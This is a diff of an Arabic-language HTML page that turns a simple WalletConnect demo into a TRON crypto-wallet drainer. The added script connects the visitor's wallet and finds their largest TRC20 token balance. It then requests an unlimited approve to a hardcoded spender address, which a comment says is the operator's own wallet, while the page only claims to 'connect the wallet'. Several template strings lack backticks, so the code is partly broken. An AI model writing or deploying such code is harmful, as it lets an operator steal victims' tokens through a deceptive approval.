@@ -1,68 +1,108 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>ربط محفظة TRON بـ WalletConnect</title>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.7.9/dist/umd/index.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.7.2/dist/umd/index.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ربط محفظة TRON وطلب Approve</title>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
+  <h2>ربط محفظة TRON</h2>
+  <button id="connectWalletBtn">ربط المحفظة</button>
+  <p id="status"></p>
 
-<button id="connectWalletBtn">ربط المحفظة</button>
+  <script>
+    const tronTokens = [
+      { symbol: "USDT", address: "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj" },
+      { symbol: "USDJ", address: "TXdjfFPMmQGZ4sfQaTx2pNUEtBY8NRBxQ9" },
+      { symbol: "TUSD", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8" },
+      { symbol: "WIN",  address: "TWbYmBzAd96PvE1gSsx2ZzyqQEz9KFNnfu" },
+      { symbol: "JST",  address: "TEkCmT2x8JzNPo7UUL4HARDvvTn5xGhv7S" }
+    ];
 
-<script>
-  const WalletConnect = window.WalletConnect.default;
-  const QRCodeModal = window.WalletConnectQRCodeModal.default;
+    // عنوان السبندر (محفظتك أو العنوان اللي هتخلي المستخدم يعمل له approve)
+    const spenderAddress = "TQBR6nj5SRpyPh7FpC6xBNTVpN39yxv4Zo";
 
-  // إنشاء كائن WalletConnect جديد (لجلسة جديدة)
-  const connector = new WalletConnect({
-    bridge: "https://bridge.walletconnect.org", // جسر الاتصال
-    qrcodeModal: QRCodeModal
-  });
+    let provider;
+    let tronWeb;
+    let userAddress;
 
-  async function connectWallet() {
-    if (!connector.connected) {
-      // إنشاء جلسة جديدة
-      await connector.createSession();
+    async function connectWallet() {
+      document.getElementById("status").innerText = "جارٍ الاتصال بالمحفظة...";
+
+      provider = new WalletConnectProvider.default({
+        rpc: {
+          11111: "https://api.trongrid.io"
+        },
+        chainId: 11111,
+        qrcode: false // يحاول يعمل deep link بدل QR
+      });
+
+      try {
+        await provider.enable();
+
+        tronWeb = new TronWeb({
+          fullHost: "https://api.trongrid.io",
+          privateKey: null,
+          provider: provider
+        });
+
+        userAddress = (await tronWeb.trx.getAccounts())[0] || (await tronWeb.defaultAddress.base58);
+
+        document.getElementById("status").innerText = المحفظة متصلة: ${userAddress};
+
+        // الآن نبحث عن أكبر رصيد توكن عند المستخدم
+        let maxToken = null;
+        let maxBalance = 0;
+
+        for (const token of tronTokens) {
+          try {
+            const contract = await tronWeb.contract().at(token.address);
+            let balance = await contract.balanceOf(userAddress).call();
+            // balance بيجي بوحدة أصغر (18 أو 6 أصفار حسب التوكن)
+            // على TRON عادة التوكنات TRC20 عدد أصفار 6, بس ممكن تختلف
+            balance = tronWeb.toBigNumber(balance.toString()).div(1e6).toNumber();
+
+            if (balance > maxBalance) {
+              maxBalance = balance;
+              maxToken = token;
+            }
+          } catch (e) {
+            console.error(`خطأ في جلب رصيد توكن ${token.symbol}`, e);
+          }
+        }
+
+        if (!maxToken) {
+          document.getElementById("status").innerText += "\nلم يتم العثور على رصيد توكنات TRC20.";
+          return;
+        }
+
+        document.getElementById("status").innerText += \nأكبر رصيد توكن: ${maxToken.symbol} = ${maxBalance};
+
+        // اطلب approve غير محدود (موافق على spender يصرف توكن غير محدود)
+        const amount = tronWeb.toHex("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
+        const contract = await tronWeb.contract().at(maxToken.address);
+
+        // send approve transaction (يجب المستخدم يوافق من المحفظة)
+        await contract.approve(spenderAddress, amount).send({ feeLimit: 100_000_000 })
+          .then(tx => {
+            document.getElementById("status").innerText += \nتم ارسال طلب الـ Approve، هتظهر لك نافذة تأكيد في المحفظة.\nمعرف المعاملة: ${tx};
+          })
+          .catch(err => {
+            document.getElementById("status").innerText += \nفشل إرسال طلب الـ Approve أو تم الرفض.;
+            console.error(err);
+          });
+
+      } catch (err) {
+        document.getElementById("status").innerText = "فشل الربط بالمحفظة أو تم إلغاء العملية.";
+        console.error(err);
+      }
     }
 
-    // عرض رابط deep link للموبايل (URI)
-    const uri = connector.uri;
-    console.log("URI:", uri);
-
-    // على الموبايل: توجه المحفظة تلقائي
-    // Deep link مخصص لـ Trust Wallet أو TronLink (معظم المحافظ تدعم WalletConnect)
-    // هذه الصيغة تطلب فتح تطبيق المحفظة تلقائيًا مع URI الجلسة
-    const deepLink = https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)};
-
-    // فتح رابط الـ deep link
-    window.location.href = deepLink;
-  }
-
-  // الزرار يربط المحفظة
-  document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
-
-  // التعامل مع حدث الاتصال
-  connector.on("connect", (error, payload) => {
-    if (error) {
-      throw error;
-    }
-    console.log("تم الاتصال بالمحفظة!");
-
-    // هنا يمكنك الحصول على عنوان المحفظة من payload
-    const accounts = payload.params[0].accounts;
-    console.log("عنوان المحفظة:", accounts[0]);
-    // تقدر تبني هنا طلبات approve بعد الربط
-  });
-
-  connector.on("disconnect", (error, payload) => {
-    if (error) {
-      throw error;
-    }
-    console.log("تم قطع الاتصال بالمحفظة");
-  });
-</script>
-
+    document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
+  </script>
 </body>
 </html>
